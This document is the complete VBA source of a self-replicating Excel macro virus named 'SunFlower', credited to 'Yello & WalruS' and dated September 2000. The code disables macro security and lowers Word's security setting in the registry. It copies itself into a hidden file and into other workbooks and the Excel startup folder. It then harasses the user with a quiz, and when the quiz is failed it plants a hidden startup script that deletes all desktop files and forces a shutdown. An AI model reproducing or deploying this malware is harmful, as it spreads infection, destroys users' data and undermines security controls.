VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisWorkbook"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long)
Private Const EWX_REBOOT = 2
' MarshYello
Private Sub Workbook_Deactivate()
' SunFlower virus By Yello & WalruS (Sept 2000)

    On Error Resume Next
    
    With Application
        .DisplayAlerts = (5 * 2 - 10)
        .Application.ScreenUpdating = (5 * 2 - 10)
        .Application.DisplayStatusBar = (5 * 2 - 10)
    End With

    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

    Open "C:\Windows\xedit.drv" For Output As #1
    Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 110)
    Close #1
    SetAttr ("C:\Windows\xedit.drv"), 6

    Set ActiveWB = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
    Set ThisWB = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule

    CheckExist = Dir(Application.StartupPath & "\Book1.")
    If CheckExist = "" Then
    VBAProject.ThisWorkbook.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    End If

    If ActiveWB.Lines(3, 1) <> "' MarshYello" Then
        ActiveWB.DeleteLines 1, ActiveWB.CountofLines
        ActiveWB.AddFromFile ("C:\Windows\xedit.drv")
        ActiveWorkbook.Save
    End If
    If Second(Now) > 58 Then Call PayloadOne
End Sub

Private Sub PayloadOne()
Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlertWarning
            .Text = "SunFlower Virus"
            .Heading = "Yello & WalruS Have You!"
            .Show
        End With
    MsgBox "Hello there " + Application.UserName + Chr(13) + Chr(13) + "Yello & WalruS have control of you P.C." + Chr(13) + Chr(13) + "We have temporally hidden some of your important windows files." + Chr(13) + Chr(13) + "Re-boot now and your P.C will never be the same" + Chr(13) + Chr(13) + "Do yourself a favour and answer our questions" + Chr(13) + Chr(13) + "Get them right and your files will be restored" + Chr(13) + Chr(13) + "Get them wrong and its godnight vienna", vbCritical, "SunFlower Virus"
        question1 = "Divide 30 by 1/2 and add 10. What is the answer ?"
        question2 = "Name one of the authors of this virus ?"
        question3 = "What does the 'V' stand for in DVD ?"
    Count = 1
    Do
    Q1 = InputBox("O.k, Question 1" + Chr(13) + Chr(13) + question1, "SunFlower Virus")
    Count = Count + 1
    Loop Until Q1 = "70"
    Count = 1
    Do
    Q2 = InputBox("O.k, Question 2 a bit harder this time" + Chr(13) + Chr(13) + question2, "SunFlower Virus")
    Count = Count + 1
    If Count = 5 Then MsgBox "Hint: One's a colour!", vbInformation, "I Am The ........."
    Loop Until Q2 = "Walrus" Or Q2 = "walrus" Or Q2 = "Yello" Or Q2 = "yello" Or Q2 = "Yellow" Or Q2 = "yellow"
    Count = 1
    Do
    If Count = 3 Then MsgBox "Last Chance", vbInformation, "SunFlower Virus"
    If Count = 4 Then Call KickOut
    Q3 = InputBox("O.k, Question 3, Get this correct and your home and dry " + Chr(13) + Chr(13) + question3, "SunFlower Virus")
    Count = Count + 1
    Loop Until Q3 = "Versatile" Or Q3 = "versatile"
    Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "Well done. Be Alert...."
            .Heading = "Yello & WalruS have left the building" + Chr(13) + "  Or have they ?"
            .Show
        End With
    Assistant.Animation = msoAnimationGetTechy
End Sub

Private Sub KickOut()
    Dim i As Integer
    On Error Resume Next
    MsgBox "Is it " & Time & " Already ?" + Chr(13) + Chr(13) + "Ive got to go", vbCritical, "Brain Dead And Computer Dead !"
    Open "C:\WINDOWS\All Users\Start Menu\Programs\StartUp\System.vbs" For Output As #1
        Print #1, "' System.vbs for SunFlower By Yello & WalruS"
        Print #1, "If Second(Now) > 56 Then"
        Print #1, "On Error Resume Next"
        Print #1, "Dim yello, wally, lamer, trader"
        Print #1, "Set yello = CreateObject(""Scripting.FileSystemObject"")"
        Print #1, "Set wally = yello.GetFolder(""C:\Windows\Desktop"")"
        Print #1, "Set trader = wally.Files"
        Print #1, "For Each lamer In trader"
        Print #1, "lamer.Delete"
        Print #1, "Next"
        Print #1, "End If"
        Close #1
        SetAttr ("C:\WINDOWS\All Users\Start Menu\Programs\StartUp\System.vbs"), 6
        For i = 1 To 250
        SendKeys "{CAPSLOCK}", True
        SendKeys "{DOWN}", True
        SendKeys "{DOWN}", True
        SendKeys "{SCROLLLOCK}", True
        SendKeys "{DOWN}", True
        SendKeys "{DOWN}", True
    Next i
    ret = ExitWindowsEx(1, 0)
End Sub


